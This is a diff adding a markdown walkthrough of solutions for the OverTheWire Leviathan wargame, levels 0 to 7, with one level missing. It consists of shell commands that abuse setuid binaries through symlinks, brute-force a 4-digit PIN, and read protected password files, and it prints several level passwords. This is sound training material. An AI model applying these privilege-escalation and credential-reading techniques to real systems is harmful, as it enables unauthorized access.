@@ -1,0 +1,120 @@
+# Leviathan Level 0 → 1 Solution
+
+	# 1. List files in home directory
+	ls -la
+
+	# 2. Check the backup directory
+	ls -la .backup/
+	
+	# 3. Extract password from HTML file
+	strings .backup/bookmarks.html | grep -oE 'leviathan1 is [^"]+' | cut -d' ' -f3
+
+	# 4. Login to Level 1
+	ssh leviathan1@leviathan.labs.overthewire.org -p 2223
+
+# Leviathan Level 1 → 2 Solution
+
+	# 1. Analyze the binary
+	ltrace ./check
+
+	# 2. Run with discovered password
+	./check
+	> sex
+
+	# 3. In new leviathan2 shell:
+	cat /etc/leviathan_pass/leviathan2
+
+	Found password: NsN1HwFoyN
+
+# Leviathan Level 2 → 3 Solution
+
+	# 1. Create working directory
+	mkdir -p /tmp/leviathan2_tmp
+	cd /tmp/leviathan2_tmp
+
+	# 2. Prepare exploit files
+	touch "test file.txt"
+	ln -s /etc/leviathan_pass/leviathan3 test
+	
+	# 3. Execute the exploit
+	~/printfile "/tmp/leviathan2_tmp/test file.txt"
+	
+	# 4. Login to Level 3
+	ssh leviathan3@leviathan.labs.overthewire.org -p 2223
+	Password: f0n8h2iWLP
+
+# Leviathan Level 4 → 5 Solution
+
+	# 1. Log in to Level 4
+	ssh leviathan4@leviathan.labs.overthewire.org -p 2223
+	# Password: WG1egElCvO
+
+	# 2. Access the hidden binary
+	.trash/bin | tr -d ' ' | perl -lpe '$_=pack"B*",$_' | head -c 10
+
+	# 3. Switch to leviathan5 (password: 0dyxT7F4QD)
+	su leviathan5
+
+	# 4. Retrieve Level 5 password
+	cat /etc/leviathan_pass/leviathan5
+
+	# 5. Log in to Level 5
+	ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+	# Password: 0dyxT7F4QD
+
+# Leviathan Level 5 → 6 Solution
+
+	# 1. Log in to Level 5
+	ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+	# Password: 0dyxT7F4QD
+
+	# 2. Inspect home directory
+	ls -la
+
+	# 3. Initial executable test
+	./leviathan5
+
+	# 4. Create target file
+	touch /tmp/file.log
+
+	# 5. Verify file creation
+	ls -l /tmp/file.log
+
+	# 6. Test file reading
+	echo "test" > /tmp/file.log
+	./leviathan5
+
+	# 7. Create symbolic link
+	ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log
+		
+	# 8. Retrieve password
+	./leviathan5
+
+	# 9. Log in to Level 6
+	
+
+# Leviathan Level 6 → 7 Solution
+
+	1. ssh leviathan6@leviathan.labs.overthewire.org -p 2223
+	# Password: szo7HDB88w
+
+	2. ls -la
+	3. file leviathan6
+	4. ls -l leviathan6
+	5. ./leviathan6 1234
+
+	6. Brute-force 4-digit code using output analysis
+		for i in $(seq -w 0000 9999); do 
+		  output=$(./leviathan6 "$i" 2>&1)
+		  echo "$i => $output"
+	 	 if [[ "$output" != *"Wrong"* ]]; then
+	 	   echo "PIN FOUND: $i"
+	 	   break
+	 	 fi
+		done
+
+	# Manually run the correct PIN after discovering it's 7123
+	
+	7. ./leviathan6 7123
+	8. whoami
+	9. cat /etc/leviathan_pass/leviathan7
